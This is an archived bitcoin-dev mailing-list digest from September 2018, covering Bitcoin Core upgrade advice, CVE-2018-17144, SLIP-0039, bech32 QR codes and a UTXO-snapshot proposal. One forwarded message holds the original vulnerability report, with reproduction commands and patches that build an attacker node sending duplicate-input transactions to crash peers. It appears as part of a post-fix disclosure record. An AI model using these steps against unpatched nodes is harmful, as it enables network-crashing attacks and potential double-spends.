> bitcoin-dev at lists.linuxfoundation.org
> https://lists.linuxfoundation.org/mailman/listinfo/bitcoin-dev



From greg at xiph.org  Sat Sep 22 04:59:53 2018
From: greg at xiph.org (Gregory Maxwell)
Date: Sat, 22 Sep 2018 04:59:53 +0000
Subject: [bitcoin-dev] [bitcoin-core-dev] Bitcoin Core update notice
In-Reply-To: <1537569586.4405.2.camel@yahoo.com>
References: <CAPg+sBhdO_7m46UphVay3vJUM+Va9=3Kq5aa4VQN4cobY-krmw@mail.gmail.com>
	<1537569586.4405.2.camel@yahoo.com>
Message-ID: <CAAS2fgQePRHfH5Aq4fi_q7+PWCuBdZfR3ac7YCw_EVAfR7b5uQ@mail.gmail.com>

On Sat, Sep 22, 2018 at 4:25 AM gb via bitcoin-dev
<bitcoin-dev at lists.linuxfoundation.org> wrote:
>
> If the bugfix can be backported to earlier versions why is the

Have been backported, not merely can be.

> hype/hysteria about "everybody" must immediately upgrade to 0.16.3
> currently being spread on the forums/reddit?

For instructions to be effective they need to be concise.  Presenting
people with a complex decision tree is not a way to maximize wellfare.

The few parties that would be better off on some other version already
know that they have some reason to not run the latest stable, and can
do more research to find out their other options.   The announcement
posted on the bitcoin core site, I think is adequately clear but if
you see an opportunity to improve it, please make suggestions.

> I don't see any effort to correct this misinformation either.

It's decent advice, not misinformation.  You can run the fixed earlier
versions but they have other issues, I wouldn't recommend anyone run
older versions generally.

Reasoning about risk is complicated. For example, when people were
talking about only the crash component of the issue there were some
people stating "I don't care if I go down, an unlikely delay in
processing payments would not be a problem."  But, in fact, a network
exploitable crash is pretty dangerous: an attacker can carve up the
network into partitions that will produce long valid forks and reorg
against each other, enabling double-spends.   The best one sentence
advice available is to upgrade to the latest version. You'd probably
have to get up to two page explanations discussing trade-offs before
it makes sense to talk about running a fixed 0.14 or what not.

Theymos' language is stronger than I would have chosen, but I think
it's language that errors on the side of protecting people from harm.

From kanzure at gmail.com  Sat Sep 22 17:54:12 2018
From: kanzure at gmail.com (Bryan Bishop)
Date: Sat, 22 Sep 2018 12:54:12 -0500
Subject: [bitcoin-dev] Fwd: [bitcoin-core-dev] On the initial notice of
	CVE-2018-17144
In-Reply-To: <CAAS2fgR9Swxv3=-u_uHrgGtfn0WhXEuOV78TFpOewCuwb3fmUA@mail.gmail.com>
References: <CAAS2fgR9Swxv3=-u_uHrgGtfn0WhXEuOV78TFpOewCuwb3fmUA@mail.gmail.com>
Message-ID: <CABaSBaxk7sJ9WFstC_aj7W==+puXkGNAqA-n96wDzOvjaC-HCg@mail.gmail.com>

---------- Forwarded message ----------
From: Gregory Maxwell via bitcoin-core-dev <
bitcoin-core-dev at lists.linuxfoundation.org>
Date: Sat, Sep 22, 2018 at 12:12 PM
Subject: [bitcoin-core-dev] On the initial notice of CVE-2018-17144
To: bitcoin-core-dev at lists.linuxfoundation.org


For some reason I don't understand, Andrea Suisani is stating on
twitter that the the report by awemany was a report of an inflation
bug, contrary to the timeline we published.   This is not the case:
the report specifically stated that inflation was not possible because
the node crashed. It also described a reproduction of the crash, but
not of inflation.

I generally understand how someone could be confused about what a
report they hadn't seen said, but I'm confused in this case because
Andrea Suisani was copied on the report to us. So I'm not sure what is
up with that, perhaps the message got lost in email.  If the reporter
knew the bug permitted inflation, they still specifically reported
otherwise to us.

Since people are also expressing doubt that awemany was actually the
author of the report, I'll include it here in its entity to aid
people's validation of the claim(s). There is a better test for the
crash issue include in master branch of the Bitcoin repository, the
reporter's reproduction instructions here are only included for
completeness.

Cheers,


Date: Mon, 17 Sep 2018 14:57:46 +0000
To: Pieter Wuille <pieter.wuille at gmail.com>, deadalnix
<deadalnix at gmail.com>, Andrea Suisani <sickpig at gmail.com>, Gregory
Maxwell <gmaxwell at gmail.com>, "Wladimir J. van der Laan"
<laanwj at gmail.com>
From: beardnboobies <beardnboobies at protonmail.com>
Subject: Zero day exploit in Bitcoin ABC and Bitcoin Core

Dear Bitcoiners,

Please find attached an encrypted description of a crashing zero day
exploit for Bitcoin Core as well as Bitcoin ABC. This has not been
reproduced for Bitcoin Unlimited, though for advisory reasons, I am
sending it to one of their members that I could find a PGP key for as
well.

Please forward this to any party who might have a valid interest,
including Bitcoin miners.

Thank you very much.

===

Problem description:

The following, miner-exploitable zero day has been found in Bitcoin ABC as
well as in Bitcoin Core:

Duplicate inputs are not checked in CheckBlock,
only when they are accepted into the mempool.

This creates a problem insofar as a transaction might bypass
the mempool when it is included in a block, for example if
it is transmitted as an extra transaction along with a compact
block.

A later assertion assert(is_spent) in SpendCoins (in validation.cpp)
seems to prevent the worse outcome of monetary inflation by
the comparatively better result of crashing the node.

To reproduce (Description is for Bitcoin ABC, but applies similarly to
Bitcoin Core):

Create one instance of ABC bitcoind without the patch below
applied (A) and create on instance of ABC with the patch applied (B).
The patch removes sending of transactions and testing for double-spent
inputs for the attacker node.

Run both in regtest mode and point them to different data directories,
like so and connect them together:
A: ./bitcoind -regtest -rpcport=15000 -listen -debug -datadir=/tmp/abc.1
B: ./bitcoind -regtest -rpcport=15001 -connect=localhost -debug
-datadir=/tmp/abc.2

Now on the prepared attacker node B, create a bunch of blocks and a
transaction
that double-spends its input, like  so for example:

> ./bitcoin-cli -regtest -datadir=/tmp/abc.2 -rpcport=15001 generate 200

> ./bitcoin-cli -regtest -datadir=/tmp/abc.2 -rpcport=15001 getnewaddress
<address>

> ./bitcoin-cli -regtest -datadir=/tmp/abc.2 -rpcport=15001 sendtoaddress
<address>
<resulting-txid>

> ./bitcoin-tx -regtest -create in=<resulting-txid>:<vout>
in=<resulting-txid>:<vout> outaddr=99.9:<address>
<resulting-txn-hex>

The double entry of the input here is not a typo. This is the desired
double-spend.

Sign the resulting transaction hex like so:

> ./bitcoin-cli -regtest -datadir=/tmp/abc.2 -rpcport=15001
signrawtransaction <txid>
<signed-txn-hex>

For Core, this step needs to be adapted to signrawtransactionwithkey.
And send the result into the small regtest test netwrok:
> ./bitcoin-cli -regtest -datadir=/tmp/abc.2 -rpcport=15001
sendrawtransaction <signed-txn-hex>

Voila, your node A should have just aborted like this:

bitcoind: validation.cpp:1083: void SpendCoins(CCoinsViewCache&, const
CTransaction&, CTxUndo&, int): Assertion `is_spent' failed.
Aborted (core dumped)

If you like this work or want to pay out a bounty for finding a zero day,
please do so in BCH to this address. Thank you very much in advance.

bitcoincash:qr5yuq3q40u7mxwqz6xvamkfj8tg45wyus7fhqzug5


The patch for ABC:

diff --git a/src/consensus/tx_verify.cpp b/src/consensus/tx_verify.cpp
index ee909deb9..ff7942361 100644
--- a/src/consensus/tx_verify.cpp
+++ b/src/consensus/tx_verify.cpp
@@ -229,7 +229,7 @@ static bool CheckTransactionCommon(const CTransaction
&tx,

     // Check for duplicate inputs - note that this check is slow so we
skip it
     // in CheckBlock
-    if (fCheckDuplicateInputs) {
+    if (0) {
         std::set<COutPoint> vInOutPoints;
         for (const auto &txin : tx.vin) {
             if (!vInOutPoints.insert(txin.prevout).second) {
diff --git a/src/net_processing.cpp b/src/net_processing.cpp
index e4ecc793c..ee1cc3cda 100644
--- a/src/net_processing.cpp
+++ b/src/net_processing.cpp
@@ -1269,12 +1269,6 @@ static void ProcessGetData(const Config
&config, CNode *pfrom,
                             // however we MUST always provide at least
what the
                             // remote peer needs.
                             typedef std::pair<unsigned int, uint256>
PairType;
-                            for (PairType &pair : merkleBlock.vMatchedTxn)
{
-                                connman->PushMessage(
-                                    pfrom,
-                                    msgMaker.Make(NetMsgType::TX,
-                                                  *block.vtx[pair.first]));
-                            }
                         }
                         // else
                         // no response
@@ -1321,25 +1315,6 @@ static void ProcessGetData(const Config
&config, CNode *pfrom,
                 bool push = false;
                 auto mi = mapRelay.find(inv.hash);
                 int nSendFlags = 0;
-                if (mi != mapRelay.end()) {
-                    connman->PushMessage(
-                        pfrom,
-                        msgMaker.Make(nSendFlags, NetMsgType::TX,
*mi->second));
-                    push = true;
-                } else if (pfrom->timeLastMempoolReq) {
-                    auto txinfo = mempool.info(inv.hash);
-                    // To protect privacy, do not answer getdata using the
-                    // mempool when that TX couldn't have been INVed
in reply to
-                    // a MEMPOOL request.
-                    if (txinfo.tx &&
-                        txinfo.nTime <= pfrom->timeLastMempoolReq) {
-                        connman->PushMessage(pfrom,
-                                             msgMaker.Make(nSendFlags,
-                                                           NetMsgType::TX,
-                                                           *txinfo.tx));
-                        push = true;
-                    }
-                }
                 if (!push) {
                     vNotFound.push_back(inv);
                 }
diff --git a/src/validation.cpp b/src/validation.cpp
index a31546432..a9edbb956 100644
--- a/src/validation.cpp
+++ b/src/validation.cpp
@@ -1080,7 +1080,7 @@ void SpendCoins(CCoinsViewCache &view, const
CTransaction &tx, CTxUndo &txundo,
     for (const CTxIn &txin : tx.vin) {
         txundo.vprevout.emplace_back();
         bool is_spent = view.SpendCoin(txin.prevout,
&txundo.vprevout.back());
-        assert(is_spent);
+        //assert(is_spent);
     }
 }


----
The same patch for Core:

diff --git a/src/consensus/tx_verify.cpp b/src/consensus/tx_verify.cpp
index 0628ec1d4..a06f77f8b 100644
--- a/src/consensus/tx_verify.cpp
+++ b/src/consensus/tx_verify.cpp
@@ -181,7 +181,7 @@ bool CheckTransaction(const CTransaction& tx,
CValidationState &state, bool fChe
     }

     // Check for duplicate inputs - note that this check is slow so
we skip it in CheckBlock
-    if (fCheckDuplicateInputs) {
+    if (0) {
         std::set<COutPoint> vInOutPoints;
         for (const auto& txin : tx.vin)
         {
diff --git a/src/net_processing.cpp b/src/net_processing.cpp
index b48a3bd22..9b7fb5839 100644
--- a/src/net_processing.cpp
+++ b/src/net_processing.cpp
@@ -1219,8 +1219,6 @@ void static ProcessGetBlockData(CNode* pfrom,
const CChainParams& chainparams, c
                     // Thus, the protocol spec specified allows for
us to provide duplicate txn here,
                     // however we MUST always provide at least what
the remote peer needs
                     typedef std::pair<unsigned int, uint256> PairType;
-                    for (PairType& pair : merkleBlock.vMatchedTxn)
-                        connman->PushMessage(pfrom,
msgMaker.Make(SERIALIZE_TRANSACTION_NO_WITNESS, NetMsgType::TX,
*pblock->vtx[pair.first]));
                 }
                 // else
                     // no response
@@ -1284,18 +1282,6 @@ void static ProcessGetData(CNode* pfrom, const
CChainParams& chainparams, CConnm
             bool push = false;
             auto mi = mapRelay.find(inv.hash);
             int nSendFlags = (inv.type == MSG_TX ?
SERIALIZE_TRANSACTION_NO_WITNESS : 0);
-            if (mi != mapRelay.end()) {
-                connman->PushMessage(pfrom, msgMaker.Make(nSendFlags,
NetMsgType::TX, *mi->second));
-                push = true;
-            } else if (pfrom->timeLastMempoolReq) {
-                auto txinfo = mempool.info(inv.hash);
-                // To protect privacy, do not answer getdata using
the mempool when
-                // that TX couldn't have been INVed in reply to a
MEMPOOL request.
-                if (txinfo.tx && txinfo.nTime <=
pfrom->timeLastMempoolReq) {
-                    connman->PushMessage(pfrom,
msgMaker.Make(nSendFlags, NetMsgType::TX, *txinfo.tx));
-                    push = true;
-                }
-            }
             if (!push) {
                 vNotFound.push_back(inv);
             }
diff --git a/src/validation.cpp b/src/validation.cpp
index 947192be0..66536af24 100644
--- a/src/validation.cpp
+++ b/src/validation.cpp
@@ -1315,7 +1315,7 @@ void UpdateCoins(const CTransaction& tx,
CCoinsViewCache& inputs, CTxUndo &txund
         for (const CTxIn &txin : tx.vin) {
             txundo.vprevout.emplace_back();
             bool is_spent = inputs.SpendCoin(txin.prevout,
&txundo.vprevout.back());
-            assert(is_spent);
+            //assert(is_spent);
         }
     }
     // add outputs
_______________________________________________
bitcoin-core-dev mailing list
bitcoin-core-dev at lists.linuxfoundation.org
https://lists.linuxfoundation.org/mailman/listinfo/bitcoin-core-dev



-- 
- Bryan
http://heybryan.org/
1 512 203 0507
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20180922/422a36a3/attachment-0001.html>

From sickpig at gmail.com  Sat Sep 22 19:22:20 2018
From: sickpig at gmail.com (sickpig at gmail.com)
Date: Sat, 22 Sep 2018 21:22:20 +0200
Subject: [bitcoin-dev] Fwd: [bitcoin-core-dev] On the initial notice of
	CVE-2018-17144
In-Reply-To: <CABaSBaxk7sJ9WFstC_aj7W==+puXkGNAqA-n96wDzOvjaC-HCg@mail.gmail.com>
References: <CAAS2fgR9Swxv3=-u_uHrgGtfn0WhXEuOV78TFpOewCuwb3fmUA@mail.gmail.com>
	<CABaSBaxk7sJ9WFstC_aj7W==+puXkGNAqA-n96wDzOvjaC-HCg@mail.gmail.com>
Message-ID: <CA+c4ZoxQFHnWvMY8sW17yrE_ccLKe82dX5W6G7nC1R7ZH6kP0A@mail.gmail.com>

Gregory,

> For some reason I don't understand, Andrea Suisani is stating on
> twitter that the the report by awemany was a report of an inflation
> bug, contrary to the timeline we published.

guess that the fact you don't understand it, it's probably related to the fact
that you didn't read properly the tweet you are referring to, for reference this
the tweet URL https://twitter.com/sickpig/status/1043530088636194816

This is the text of such a tweet:

"He [awemany] *did not* mention the inflation bug in the email, still
he has proof
he was aware of that before sending out the report"

then tweet continue referring a reddit post where awemany while trying
to prove he  was the original author of the report, included a timestamped note
containing the following text:

    BitcoinABC does not check for duplicate inputs when processing a block,
    only when inserting a transaction into the mempool.

    This is dangerous as blocks can be generated with duplicate transactions
    and then sent through e.g. compact block missing transactions and avoid
    hitting the mempool, creating money out of thin air.

  /u/awemany

this the timeline of the timestamping process:

https://originstamp.org/s/5c45a1ba957362a2ba97c9f8c48d4d59d4fa990945b7094a8d2a98c3a91ed9b6

as you can see the note was submitted to originstamp.org before the
report email was sent.

>  This is not the case:
> the report specifically stated that inflation was not possible because
> the node crashed. It also described a reproduction of the crash, but
> not of inflation.

Furthermore as you should be aware, having been copied on the report,
awemany specifically
said that "[the assert(is_spent)] *seems* to prevent the worse outcome
of monetary inflation"

I guess that in the hurry of informing you and other people involved of the DoS
vector he identified and proved, he decided to give priority to
informing Core about that
rather than waiting and continue exploring the idea he had about exploiting the
code to create coins out of thin air.

From greg at xiph.org  Sat Sep 22 20:49:04 2018
From: greg at xiph.org (Gregory Maxwell)
Date: Sat, 22 Sep 2018 20:49:04 +0000
Subject: [bitcoin-dev] Fwd: [bitcoin-core-dev] On the initial notice of
	CVE-2018-17144
In-Reply-To: <CA+c4ZoxQFHnWvMY8sW17yrE_ccLKe82dX5W6G7nC1R7ZH6kP0A@mail.gmail.com>
References: <CAAS2fgR9Swxv3=-u_uHrgGtfn0WhXEuOV78TFpOewCuwb3fmUA@mail.gmail.com>
	<CABaSBaxk7sJ9WFstC_aj7W==+puXkGNAqA-n96wDzOvjaC-HCg@mail.gmail.com>
	<CA+c4ZoxQFHnWvMY8sW17yrE_ccLKe82dX5W6G7nC1R7ZH6kP0A@mail.gmail.com>
Message-ID: <CAAS2fgQYx=11jOWBjYyEX42X=KdqB_V3d0j+4yG+br0Ag590xw@mail.gmail.com>

On Sat, Sep 22, 2018 at 7:22 PM sickpig at gmail.com <sickpig at gmail.com> wrote:
> > For some reason I don't understand, Andrea Suisani is stating on
> > twitter that the the report by awemany was a report of an inflation
> > bug, contrary to the timeline we published.
>
> guess that the fact you don't understand it, it's probably related to the fact
> that you didn't read properly the tweet you are referring to, for reference this
> the tweet URL https://twitter.com/sickpig/status/1043530088636194816
>
> This is the text of such a tweet

OKAY.  The only tweet I was shown was this one:

https://twitter.com/sickpig/status/1043428373530390528

It doesn't many any mention to him not reporting it and I encountered
it in the context of another person citing it to claim it had been
reported.

> Furthermore as you should be aware, having been copied on the report,
> awemany specifically
> said that "[the assert(is_spent)] *seems* to prevent the worse outcome
> of monetary inflation"

Yes, in fact I referred to the that specifically in my message as well
as including his entire message in my post.

> I guess that in the hurry of informing you and other people involved of the DoS
> vector he identified and proved, he decided to give priority to
> informing Core about that
> rather than waiting and continue exploring the idea he had about exploiting the
> code to create coins out of thin air.

I'm unclear what you're now stating. Are you stating that awemany knew
that it could
cause inflation but indicated otherwise to us or are you stating that
he did not know and
in the abundance of caution he sent the report as fast as possible
before making that
determination?

I'm just asking because I'm confused by your response; I don't think
it's particularly important one way or another.

From iberrozpe at gmail.com  Mon Sep 24 19:49:08 2018
From: iberrozpe at gmail.com (Ignacio Berrozpe)
Date: Mon, 24 Sep 2018 21:49:08 +0200
Subject: [bitcoin-dev] SLIP-0039: Shamir's Secret-Sharing for Mnemonic
	Codes
In-Reply-To: <4e2c7b41-1e16-b89a-04d8-776f3469141a@satoshilabs.com>
References: <4e2c7b41-1e16-b89a-04d8-776f3469141a@satoshilabs.com>
Message-ID: <CAF8cz+pxaEpg9FtqmegxAZyGWGb1Z2P8rJCCAVerLhMZ5B8xOA@mail.gmail.com>

Hi Andrew

Please allow me to comment on your work, as I happened to publish an
article 5 months ago proposing SSS to split bitcoins private keys into
shares that could be encoded directly using BIP-0039 mnemonic words. While
cryptographically much simpler than your proposal, the proposal had the
characteristic that it could be applied directly to existing private keys
backups, by splitting the keys into SSS shares that could benefit from the
existing BIP-0039 mnemonic to encode directly the shares. I thought it
would be a simple path for hardware wallets providers such as Trezor into
providing a better/more secure alternative the existing BIP-0039 privatekey
backups of 24 words.

The article can be found here, and I've enclosed a simplified version

https://privatekeys.org/2018/04/24/k-of-m-private-key-generation-and-backup-in-bitcoin-wallets/

Mind two questions? Your proposed work provides a way to split the
pre-secret into SSS shares, a format of encoding the shares, and finally
several methods to derive the master secret from the pre-secret. Would you
envision standarizing these different topics under the same proposal? Also,
have you thought of a way to deal with the existing legacy privatekeys
already encoded into BIP-0039, or stored in other formats, and how to
migrate them securely into a schema of encoded SSS shares?

Best regards
Ignacio Berrozpe







On Fri, Sep 21, 2018 at 8:18 PM Andrew Kozlik via bitcoin-dev <
bitcoin-dev at lists.linuxfoundation.org> wrote:

> Hello everyone,
>
> We are currently writing a new specification for splitting BIP-32 master
> seeds into multiple mnemonics using Shamir's secret sharing scheme. We
> would be interested in getting your feedback with regard to the
> high-level design of the new spec:
> https://github.com/satoshilabs/slips/blob/master/slip-0039.md
> Please focus your attention on the section entitled "Master secret
> derivation functions", which proposes several different solutions. Note
> that there is a Design Rationale section at the very end of the
> document, which should answer some of the questions you may have. The
> document is a work in progress and we are aware that some technical
> details have not been fully specified. These will be completed once the
> high level design has been settled.
>
> Thanks,
>
> Andrew Kozlik
> TREZOR Team
>
>
> _______________________________________________
> bitcoin-dev mailing list
> bitcoin-dev at lists.linuxfoundation.org
> https://lists.linuxfoundation.org/mailman/listinfo/bitcoin-dev
>
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20180924/9bc30814/attachment-0001.html>
-------------- next part --------------
A non-text attachment was scrubbed...
Name: KofM  Private Key Generation and Backup in Bitcoin Wallets _ Submit.rtf
Type: application/msword
Size: 1074372 bytes
Desc: not available
URL: <http://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20180924/9bc30814/attachment-0001.doc>

From shiva at blockonomics.co  Tue Sep 25 06:59:48 2018
From: shiva at blockonomics.co (shiva sitamraju)
Date: Tue, 25 Sep 2018 12:29:48 +0530
Subject: [bitcoin-dev] URI scheme with optional bech32 address
Message-ID: <CABuOfugx7+mM3doSCNL24J6yot7WNJZ9LP+8hkLAVpu0jDz9TA@mail.gmail.com>

Hi,

I am not sure why this wasn't discussed more but it seemed like a very good
idea to me
https://www.reddit.com/r/Bitcoin/comments/9iivej/its_been_like_a_year_and_bech32_adoption_remains/

QR code is very important for network wide adoption. The problem is bech32
qr code isn't backward compatible and noone is going to show two QR codes.
Everyone is going safe with P2SH address qr code.

Example of proposed URI. I want not sure of technically best encoding, but
this is just for ideas

bitcoin:3BnsWZiTdYVrqiPh2RP3q9Y3ZqvhbCN2it?bech32=bc1q5u92yq20hss4rc99mfu23h4dxkxn4uuyqd5dzy
bitcoin:3BnsWZiTdYVrqiPh2RP3q9Y3ZqvhbCN2it?keyhash=a70aa2014fbc2151e0a5da78a8dead358d3af384
bitcoin:3BnsWZiTdYVrqiPh2RP3q9Y3ZqvhbCN2it?amount=0.123&bech32=bc1q5u92yq20hss4rc99mfu23h4dxkxn4uuyqd5dzy

As merchants/exchanges adopt this QR code, wallets that support bech32 can
chose to autopay to bech32 address  (for lower tx fee). This can create a
network effect as more people start using bech32 and when we reach enough
wallet adoption, people can shift to just showing bech32 QR codes


-- 
Shiva S
CEO @ Blockonomics <https://www.blockonomics.co>
Decentralized and Permissionless Payments
Join us on Telegram <https://t.me/BlockonomicsCo>
View our Welcome Guide
<https://www.blockonomics.co/docs/blockonomics-brochure.pdf>
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20180925/66ec4bcb/attachment.html>

From greg at xiph.org  Tue Sep 25 16:09:17 2018
From: greg at xiph.org (Gregory Maxwell)
Date: Tue, 25 Sep 2018 16:09:17 +0000
Subject: [bitcoin-dev] Trivia on the history of compact fraud proofs and
	anti censorship.
In-Reply-To: <CAAS2fgRaNzz8+DRXgPBkOn4o0RYR_4KFJvKLOd5MtS=DKmDJDg@mail.gmail.com>
References: <CAAS2fgRaNzz8+DRXgPBkOn4o0RYR_4KFJvKLOd5MtS=DKmDJDg@mail.gmail.com>
Message-ID: <CAAS2fgS+_Xp7sZAQxwJ=oGXvzOrc6er_DCPL9b3ag7WHfW7FSQ@mail.gmail.com>

It's generally not /too/ important where ideas come from, even in our
open source non-patent encumbering world the only compensation people
get for sharing a good idea is the credit they receive. Most of the
time people are still happy to see their ideas further developed, even
if credit isn't sufficiently given.

But I'm particularly disappointed when attribution gets withheld in
the furtherance of political attaks. In some cases people have adopted
public positions that e.g. Bitcoin developers don't care about
scalability and then show that, by comparison, they care by publishing
work explaining/elaborating the scaling work of Bitcoin devs, but to
maintain consistency with their claims go through an extended effort
to avoid attributing them.

In two cases so far, I've painstakingly walked through an idea with a
political opponent in the Bitcoin space in private, only to have them
turn around and present the ideas I argued into their heads as novel
inventions without a shred of credit to me or the Bitcoin development
community.

One of them was the case of Peter R and the subchains paper, which I
previously forwarded to the list the correspondence between myself and
him where I argued the concept of preconsensus as part of his disproof
of the orphaning-controls-capacity claim.

The other is on compact fraud proofs with Justus Ranvier (again, a BU
person). I promptly complained directly to Justus when I saw him doing
it. I'm now forwarding to the list for posterity, because after almost
two years and several pings, I was never even given a response.

This came up to my attention today because V. Buterin published a
paper on lite client security ( https://arxiv.org/pdf/1809.09044.pdf )
that was apparently unaware of proposals from our community on sampled
anti-withholding[1]. ... and this paper cites Justus' writeup as both
the only example of fraud proofs previously, and evidence that
sampling coded data was not previously considered.

[1] e.g. https://download.wpsoftware.net/bitcoin/wizards/2015-04-18.html
starting at "The improvement we have is this". Error coded
anti-withholding been discussed many times-- and I've been pretty
bummed that I've been unable to excite people much about the idea,
hopefully that will change with the eth hype machine behind it--, but
this particular citation is while not the earliest or clearest
description, perfect for this case since the context is that it's a
complaint that the same author was failing to cite our communities
past efforts on fraud proofs, and as a result they weren't aware of
the state of the art like anti-withholding.

---------- Forwarded message ---------
From: Gregory Maxwell <gmaxwell at gmail.com>
Date: Fri, Nov 25, 2016 at 9:46 PM
Subject: A plea for ethical behavior
To: Justus Ranvier <justusranvier at gmail.com>


https://www.reddit.com/r/btc/comments/5evvth/fraud_proofs/

I spent _hours_ explaining how this technology would work to you on
reddit in private message, walking you through arguments on it.
Pointing out some of the details.

I also originally introduced the idea of compact fraud proofs to the
community (though the general idea was that of Bitcoin's creator,
without the compact-- just the unworkable kind) and was the first
person to enumerate the missing components for it.

Yet, the idea here is attribute solely to you, leaving me erased from history.

This isn't right.  It is especially offensive because the same parties
affiliated with BU use this plagiarism as a proof point that they are
scaling innovators while I am not, -- the height of absurdity when
they do it with ideas I invented and introduced to them.

Mike Hearn didn't have the integrity to credit Matt for the invention
of thinblocks; instead he was happy to have other people misrepresent
the history, I think you are a better person than him and hope you
will say something.

------

From dscotese at litmocracy.com  Tue Sep 25 15:47:28 2018
From: dscotese at litmocracy.com (Dave Scotese)
Date: Tue, 25 Sep 2018 08:47:28 -0700
Subject: [bitcoin-dev] Proposal to replace full blockchain with recent
	history plus UTXO Set
In-Reply-To: <CAGLBAhfOdeNfsOfzY0H7wxG1jn2SE3P36aRd_VHXb5nizwA93A@mail.gmail.com>
References: <CAGLBAhfOdeNfsOfzY0H7wxG1jn2SE3P36aRd_VHXb5nizwA93A@mail.gmail.com>
Message-ID: <CAGLBAhdAyNx8_Krqer3oWa1-G-fPS2+UF1Owo4apuGXMvmELHQ@mail.gmail.com>

 The image at imgur and the pastebin both reference block 542324 but the
correct block is 542322.  As the pastebin shows, the decimal and hex
representations I gave for the block height did not match, and this is
why.  If you use the Merkle root for block 542322 instead of 542324, you'll
be able to see the correct Game of Life play out and make the apron image.

Dave.

On Fri, Sep 21, 2018 at 6:49 PM Dave Scotese <dscotese at litmocracy.com>
wrote:

> I've been working on an idea that relieves full nodes of storing the
> entire blockchain. Open source software generally relies on the fact that
> "enough" people agree that it's secure. Bitcoin software works that way
> too. So if you understand enough to see that a UTXO set is valid at a
> certain block height, and there are enough other people who agree and that
> set is recognizable by humans, then we can use that UTXO set and ditch the
> blockchain that existed up to that point. It would save a lot of storage
> and make it a lot easier to run a full node.
>
> Have you reviewed the source code from which your wallets were compiled?
> At some point, we all trust third parties, but generally (at least among
> people who understand Bitcoin) they are large composite groups so that no
> small group or individual can profit from cheating.
>
> I look forward to answering any concerns and also to any offers of help.   I
> used block 542324 of the Bitcoin blockchain to make a memorable experience
> using the game of life. I wrote a script for the open-source Game-of-Life
> software Golly and shared it in the paste at https://pastebin.com/k5Ssc0qk.
> It produces the image at https://imgur.com/a/rwIQuVz. If someone can tell
> me how to get a UTXO Set from the bitcoin client, I'll send them $50 of
> bitcoin. Then I could get the SHA256 hash of that set and try to make a
> recognizable checkpoint for the Bitcoin blockchain. If someone runs Golly
> and shares a video of the game playing out (into the apron-shaped image),
> I'll send them $50 of bitcoin too.
>
> In a few decades when the blockchain has grown to a few terabytes and the
> UTXO Set is still just a few gigabytes, I'd like to see more people start
> running full nodes without the hassle of a long wait and loads of storage
> space. That's what stops me from running one.
>
>

-- 
I like to provide some work at no charge to prove my value. Do you need a
techie?
I own Litmocracy <http://www.litmocracy.com> and Meme Racing
<http://www.memeracing.net> (in alpha).
I'm the webmaster for The Voluntaryist <http://www.voluntaryist.com> which
now accepts Bitcoin.
I also code for The Dollar Vigilante <http://dollarvigilante.com/>.
"He ought to find it more profitable to play by the rules" - Satoshi
Nakamoto
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.linuxfoundation.org/pipermail/bitcoin-dev/attachments/20180925/f5facd70/attachment.html>

From willtech at live.com.au  Tue Sep 25 21:55:49 2018
From: willtech at live.com.au (Damian Williamson)
Date: Tue, 25 Sep 2018 21:55:49 +0000
Subject: [bitcoin-dev] [bitcoin-discuss] Proposal to replace full
 blockchain with	recent history plus UTXO Set
In-Reply-To: <CAGLBAhcvf6o0J4us3=d0LMmcO_AyZZZtVbsaST9Scth6yX+eSQ@mail.gmail.com>
References: <CAGLBAheT0DB4Aid01vqdkwGJ6U=Fn8A4TU+XKrC=PygdXyvJjg@mail.gmail.com>,
	<CAGLBAhcvf6o0J4us3=d0LMmcO_AyZZZtVbsaST9Scth6yX+eSQ@mail.gmail.com>
Message-ID: <PS2P216MB01795F6E52A18C73E20E9D5A9D160@PS2P216MB0179.KORP216.PROD.OUTLOOK.COM>

A fairly decent rework would be needed but it seems that the idea has merit initially.


As it is now, it is not only that a utxo exists but, that the transaction it references and the block it is within can also be fully validated.


So, if a utxo block set type existed then by consensus every so often a bunch of blocks containing just the validated utxo set to a given height, say 100,000 blocks below the current blockheight, and necessary header data could be appended onto the valid chain and nodes would be free to drop all preceding blocks. I suspect that many wouldn't and that even many new nodes would still desire to download the full blockchain but, for the use case you mention it would make sense.


If done [right/wrong] it may even make Satoshi's fortune spendable. Something to watch out for.

________________________________
From: bitcoin-discuss-bounces at lists.linuxfoundation.org <bitcoin-discuss-bounces at lists.linuxfoundation.org> on behalf of Dave Scotese via bitcoin-discuss <bitcoin-discuss at lists.linuxfoundation.org>
Sent: Wednesday, 26 September 2018 1:46:54 AM
To: Bitcoin Discuss
Subject: Re: [bitcoin-discuss] Proposal to replace full blockchain with recent history plus UTXO Set

The image at imgur and the pastebin both reference block 542324 but the correct block is 542322.  As the pastebin shows, the decimal and hex representations I gave for the block height did not match, and this is why.  If you use the Merkle root for block 542322 instead of 542324, you'll be able to see the correct Game of Life play out and make the apron image.

Dave.

On Sun, Sep 23, 2018 at 11:38 AM Dave Scotese <dscotese at litmocracy.com<mailto:dscotese at litmocracy.com>> wrote:
I thought I didn't have access to the dev list and so intended to post the following proposal to this discussion list, but used the wrong email address.  Anyway, my email did get into the dev list (https://lists.linuxfoundation.org/pipermail/bitcoin-dev/2018-September/016420.html) but I'll repeat it here:

I've been working on an idea that relieves full nodes of storing the entire blockchain. Open source software generally relies on the fact that "enough" people agree that it's secure. Bitcoin software works that way too. So if you understand enough to see that a UTXO set is valid at a certain block height, and there are enough other people who agree and that set is recognizable by humans, then we can use that UTXO set and ditch the blockchain that existed up to that point. It would save a lot of storage and make it a lot easier to run a full node.

Have you reviewed the source code from which your wallets were compiled? At some point, we all trust third parties, but generally (at least among people who understand Bitcoin) they are large composite groups so that no small group or individual can profit from cheating.

